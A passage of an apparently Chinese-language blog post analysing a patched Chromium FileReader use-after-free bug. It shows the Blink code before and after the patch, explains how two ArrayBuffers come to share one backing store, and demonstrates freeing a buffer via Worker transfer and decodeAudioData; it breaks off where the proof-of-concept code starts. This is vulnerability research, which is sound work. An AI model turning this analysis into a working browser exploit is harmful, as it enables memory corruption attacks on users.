class="undefined">reader.onprogress = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('current read bytes: ' + event.target.result.byteLength);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.onloadend = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('read as ArrayBuffer: ' + event.target.result);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为待读取的内容比较大，因此可以看到 <code>onprogress</code> 回调函数被多次触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">current read bytes: 69730304</span><br><span class="line">current read bytes: 104660992</span><br><span class="line">current read bytes: 104857600</span><br><span class="line">read as ArrayBuffer: [object ArrayBuffer]</span><br></pre></td></tr></table></figure><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="2-2-1-代码查看"><a href="#2-2-1-代码查看" class="headerlink" title="2.2.1 代码查看"></a>2.2.1 代码查看</h4><p>由于众所周知的原因，在国内下载 Chromium 的源码是非常不方便的，另外如果电脑配置一般的话，在 Visual Studio 中查看和编译代码也是一件非常痛苦的事情，因此笔者推荐使用 Chromium 的在线浏览代码功能，因为支持查找和跳转，使用起来非常方便。查看代码的 URL 格式非常简单，指明文件路径、CL 版本（Change List 版本，即 GIT 提交时创建的 HASH 值）、代码行号即可。</p><blockquote><p><a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137</a></p></blockquote><h4 id="2-2-2-补丁对比"><a href="#2-2-2-补丁对比" class="headerlink" title="2.2.2 补丁对比"></a>2.2.2 补丁对比</h4><p>从 Chrome 的安全公告可知漏洞的内部 ID 为 <a href="https://crbug.com/936448" target="_blank" rel="noopener">936448</a> ，尽管漏洞报告暂时不可访问，但是基于漏洞 ID 可以找到补丁的提交记录 <a href="https://chromium.googlesource.com/chromium/src/+/150407e8d3610ff25a45c7c46877333c4425f062" target="_blank" rel="noopener">150407e</a> （上一版本为 <a href="https://chromium.googlesource.com/chromium/src/+/1675c51b1d83160a8b7061f38bb722b2c43937b4" target="_blank" rel="noopener">1675c51</a> ）。</p><p>补丁之前的代码如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补丁之后的代码如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=150407e8d3610ff25a45c7c46877333c4425f062&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  AdjustReportedMemoryUsageToV8(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">  raw_data_.reset();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在补丁之前，下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure><p>在补丁之后，上面的代码仅会被调用一次，取而代之的是下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure><p>所以这里关键的差异点在于 <strong>多次调用</strong> 下面两行代码的差异：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before patch</span></span><br><span class="line">raw_data_-&gt;ToArrayBuffer()</span><br><span class="line"><span class="comment">// after patch</span></span><br><span class="line">ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength())</span><br></pre></td></tr></table></figure><h4 id="2-2-3-漏洞分析"><a href="#2-2-3-漏洞分析" class="headerlink" title="2.2.3 漏洞分析"></a>2.2.3 漏洞分析</h4><p>如无特殊说明，本文所有代码均基于有漏洞的版本（<strong><em>1675c51b1d83160a8b7061f38bb722b2c43937b4</em></strong>）进行分析。</p><ol><li>函数 <code>FileReaderLoader::ArrayBufferResult</code> 中 <code>raw_data_</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=157" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.h:157</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ArrayBufferBuilder&gt; raw_data_;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>ArrayBufferBuilder::ToArrayBuffer</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=103" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc:103</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBufferBuilder::ToArrayBuffer() &#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;ByteLength() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;Slice(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>先看 <code>buffer_</code> 的类型，后续再深入分析<code>ArrayBufferBuilder::ToArrayBuffer</code> （<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=94" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h:94</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WTF &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WTF_EXPORT</span> <span class="title">ArrayBufferBuilder</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="keyword">unsigned</span> bytes_used_;</span><br><span class="line">  <span class="keyword">bool</span> variable_capacity_;</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer_;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><code>ArrayBuffer::Slice</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=259" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:259</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Slice(<span class="keyword">int</span> begin, <span class="keyword">int</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> SliceImpl(ClampIndex(begin), ClampIndex(end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::SliceImpl(<span class="keyword">unsigned</span> begin,</span><br><span class="line">                                                  <span class="keyword">unsigned</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::Create(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(Data()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>ArrayBuffer::Create</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=144" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:144</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Create(<span class="keyword">const</span> <span class="keyword">void</span>* source,</span><br><span class="line">                                               <span class="keyword">size_t</span> byte_length) &#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY(!contents.Data()))</span><br><span class="line">    OOM_CRASH();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::AdoptRef(<span class="keyword">new</span> ArrayBuffer(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;Data(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回到第 <strong>2</strong> 步，在函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 中，如果 <code>buffer_</code> 的空间满了，则直接返回 <code>buffer_</code> 本身，否则调用 <code>ArrayBuffer::Slice</code> 返回一个 <code>ArrayBuffer</code> 副本。</p><p>最后看一下 <code>DOMArrayBuffer::Create</code> 的定义，注意该函数有多个重载，触发漏洞所用的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=20" target="_blank" rel="noopener">src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h:20</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> blink &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CORE_EXPORT</span> <span class="title">DOMArrayBuffer</span> <span class="title">final</span> :</span> <span class="keyword">public</span> DOMArrayBufferBase &#123;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(<span class="built_in">std</span>::move(buffer));</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">DOMArrayBuffer</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span></span></span><br><span class="line">      : DOMArrayBufferBase(std::move(buffer)) &#123;&#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数比较简单，就是基于 <code>WTF::ArrayBuffer</code> 创建 <code>blink::DOMArrayBuffer</code> ，不要被 <code>std::move</code> 所迷惑，这里只是针对函数形参 <code>scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer</code> 进行 <a href="https://en.cppreference.com/w/cpp/utility/move" target="_blank" rel="noopener">move</a> ，不影响形参智能指针所指向的具体对象。</p><p>那么，这里的漏洞到底是如何产生的呢？回到有问题的 <code>FileReaderLoader::ArrayBufferResult</code> 函数，如果在数据读取完毕时刚好触发了 <code>onprogress</code> 回调函数（注意此时尚未触发 <code>onloadend</code> 函数），因为数据已经读取完毕，函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 直接返回 <code>buffer_</code> ，在此过程中，没副本产生！当回调函数 <code>onloadend</code> 触发时，返回的 <strong>ArrayBuffer</strong> 将会与 <code>onprogress</code> 返回的 <strong>ArrayBuffer</strong> 共享同一 <strong>backing store</strong> （即底层存储数据用的堆块）！当手上有两个这样的 <strong>ArrayBuffer</strong> 时，可以先释放其中一个，那么访问另一个时将导致 <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> 。</p><p>那么，你是否也会怀疑，在数据读取完毕的时候真的会出现先后触发 <code>onprogress</code> 和 <code>onloadend</code> 的情况吗？笔者也有这样的疑问，但是本文前面提供的 <a href="https://programlife.net/tags/FileReader/">FileReader</a> 测试代码的运行结果表明，确实就有这样的情况：最后一次触发 <code>onprogress</code> 回调函数时，读取的数据长度为 <code>104857600</code> ，表明数据已经读取完毕。</p><p>在补丁之后的代码中，如果 <code>finished_loading_</code> 尚未标记，那么总是调用 <code>ArrayBuffer::Create</code> 返回一个 ArrayBuffer 副本，这样就避免了两个 ArrayBuffer 共享同一 <strong>backing store</strong> 的情况的出现。</p><h3 id="2-3-POC-构造"><a href="#2-3-POC-构造" class="headerlink" title="2.3 POC 构造"></a>2.3 POC 构造</h3><h4 id="2-3-1-ArrayBuffer-Neutering"><a href="#2-3-1-ArrayBuffer-Neutering" class="headerlink" title="2.3.1 ArrayBuffer Neutering"></a>2.3.1 ArrayBuffer Neutering</h4><p>在构造 POC 之前，先学习一下怎么释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示（<a href="https://cs.chromium.org/chromium/src/v8/include/v8.h?l=4819" target="_blank" rel="noopener">src/v8/include/v8.h:4819</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Detaches this ArrayBuffer and all its views (typed arrays).</span></span><br><span class="line"><span class="comment"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span></span><br><span class="line"><span class="comment"> * preventing JavaScript from ever accessing underlying backing store.</span></span><br><span class="line"><span class="comment"> * ArrayBuffer should have been externalized and must be detachable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Detach</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO(913887): fix the use of 'neuter' in the API.</span></span><br><span class="line">V8_DEPRECATE_SOON(<span class="string">"Use Detach() instead."</span>, <span class="keyword">inline</span> <span class="keyword">void</span> Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Make this ArrayBuffer external. The pointer to underlying memory block</span></span><br><span class="line"><span class="comment"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span></span><br><span class="line"><span class="comment"> * had been externalized, it does no longer own the memory block. The caller</span></span><br><span class="line"><span class="comment"> * should take steps to free memory when it is no longer needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span></span><br><span class="line"><span class="comment"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span></span><br><span class="line"><span class="comment"> * was allocated with ArraryBuffer::Allocator::Allocate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Contents <span class="title">Externalize</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p><p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" target="_blank" rel="noopener">Web Workers</a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p><p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">Structured clone algorithm</a> 来实现这一特性。</p><p>如果要传递的对象实现了 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" target="_blank" rel="noopener">Transferable</a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p><p>线程相关的两个重要概念定义如下：</p><ul><li><p><code>postMessage</code> 发送消息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>message 表示要传递的数据</li><li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li></ul></li><li><p><code>onmessage</code> 响应消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure><ul><li>通过事件的 <code>data</code> 属性访问接收到的数据</li></ul></li></ul><p>一个简单的例子如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- main.html 的代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: before postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined">worker.postMessage(ab, [ab]);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: after postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js 的代码</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ab = message.data;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Worker thread: received: '</span> + ab);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Wroker thread: ArrayBuffer.byteLength is : '</span> + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure><p>McAfee Labs 的文章提到，使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" target="_blank" rel="noopener">AudioContext.decodeAudioData</a> 同样可以实现 ArrayBuffer 的 <a href="https://programlife.net/tags/Neuter/">Neuter</a> 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Before decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode succeed: '</span> + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode failed: '</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'After decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure><h4 id="2-3-2-POC-构造"><a href="#2-3-2-POC-构造" class="headerlink" title="2.3.2 POC 构造"></a>2.3.2 POC 构造</h4><p>分析清楚了漏洞的底层原理，写 POC 就是很简单的事情了，笔者构造的 POC 代码如下所示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 